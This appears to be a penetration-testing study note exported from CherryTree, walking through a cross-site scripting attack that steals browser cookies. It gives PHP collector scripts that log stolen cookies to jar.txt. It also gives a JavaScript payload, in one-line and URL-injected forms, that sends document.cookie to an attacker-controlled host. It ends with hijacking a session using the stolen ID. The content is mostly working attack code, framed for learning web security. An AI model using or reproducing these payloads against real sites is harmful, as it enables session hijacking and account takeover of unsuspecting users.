<!doctype html>
<html>

<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>example: steal cookies without an alert message</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>

<body>
  <div class='page'>
    <h1 class='title'>example: steal cookies without an alert message</h1><br />Firefox extensions may help a lot in
    testing how the Cookies mechanism works in a Website<br /><a
      href="https://addons.mozilla.org/en-US/firefox/addon/3829" target="_blank">Live HTTP Header</a>: helps understanding WHEN the
    cookie is being sent<br /><a href="https://addons.mozilla.org/en-US/firefox/addon/4510">Cookie Editor</a>: shows the
    installed cookies and the &lt;domain,path,expiration&gt; parameters<br /><br /><br /><strong>
      <h3>get.php (http://attacker.site/get.php)</h3>
    </strong><br />First thing we need a web page as Attacker that we own(in our example <strong>get.php</strong>) that
    is able to:<br />1. accept the request from the vulnerable site<br />2. retrieve the cookies and store them in a
    file in the attacker server<br />We will save the stolen cookies in the file jar.txt that will be passed(see that in
    the next paragraph javascript payload) by
    <code>i.src=&quot;http://your.site/get.php?cookies=&quot;+document.cookie;</code><br />
    <div class="codebox">
      <div class="codebox">
        &lt;?php<br />print(&quot;we&nbsp;store&nbsp;the&nbsp;cookies&nbsp;in&nbsp;the&nbsp;file&nbsp;jar.txt:\n\n&quot;);<br />$ip&nbsp;=&nbsp;$_SERVER[&#39;REMOTE_ADDR&#39;];<br />$browser&nbsp;=&nbsp;$_SERVER[&#39;HTTP_USER_AGENT&#39;];<br /><br />$fp&nbsp;=&nbsp;fopen(&#39;jar.txt&#39;,&nbsp;&#39;a&#39;);<br /><br />fwrite($fp,&nbsp;$ip.&#39;&nbsp;&#39;.$browser.&quot;&nbsp;\n&quot;);<br />fwrite($fp,&nbsp;urldecode($_SERVER[&#39;QUERY_STRING&#39;]).&nbsp;&quot;\n\n&quot;);<br />fclose($fp);<br />?&gt;<br />
      </div>
    </div><br />or a simpler version<br />
    <div class="codebox">
      <div class="codebox">
        &lt;?php<br />$filename=&quot;/tmp/jar.txt&quot;;<br />$fp=fopen($filename,&nbsp;&#39;a&#39;);<br />$cookie=$_GET[&#39;id&#39;];<br />fwrite($fp,&nbsp;$cookie);<br />fclose($fp);<br />?&gt;<br />
      </div>
    </div><br /><br /><strong>
      <h3>javascript payload </h3>
    </strong><br />Payload that we have inject in the website with a form or something similar<br />This payload create
    new image object and set the address of the image to our website link.<br />With this simple code we trick the
    victim browser to request our webpage and send to it the cookies<br />
    <div class="codebox">
      <div class="codebox">
        &lt;script&gt;<br />var&nbsp;i&nbsp;=&nbsp;new&nbsp;Image();<br />i.src=&quot;http://attacker.site/get.php?cookies=&quot;+document.cookie;<br /><span
          style="color:#000000;font-weight:400">&lt;</span>/script<span
          style="color:#000000;font-weight:400">&gt;</span></div>
    </div><br />that in a single line would be<br />
    <div class="codebox">
      <div class="codebox">
        &lt;script&gt;var&nbsp;i=new&nbsp;Image();i.src=&quot;http://attacker.site/get.php?cookies=&quot;+document.cookie;<span
          style="color:#000000;font-weight:400">&lt;</span>/script<span
          style="color:#000000;font-weight:400">&gt;</span></div>
    </div><br />That in a url would be:<br />
    <div class="codebox">
      <div class="codebox">
        http://www.example.com/members/search.php?kw=&lt;script&gt;var&nbsp;i=new&nbsp;Image();i.src=&quot;http://attacker.site/get.php?cookies=&quot;+document.cookie;<span
          style="color:#000000;font-weight:400">&lt;</span>/script<span
          style="color:#000000;font-weight:400">&gt;</span></div>
    </div><br />Now we put in place our plan, first we need to go to the vulnerable website and paste our javascript
    code<br /><a href=""><img src="images/340-1.png" alt="images/340-1.png" /></a><br /><br />Stolen cookies in the
    jar.txt file in our website<br /><a href=""><img src="images/340-2.png" alt="images/340-2.png" /></a><br /><br />now
    that we have stolen the sessionID we can change it an acces like another user <br /><a
      href="file://C:/CherryTree/screenshot/Web Application Attacks/XSS4.png" ><img src="images/340-3.png"
        alt="images/340-3.png" /></a>
  </div>
</body>

</html>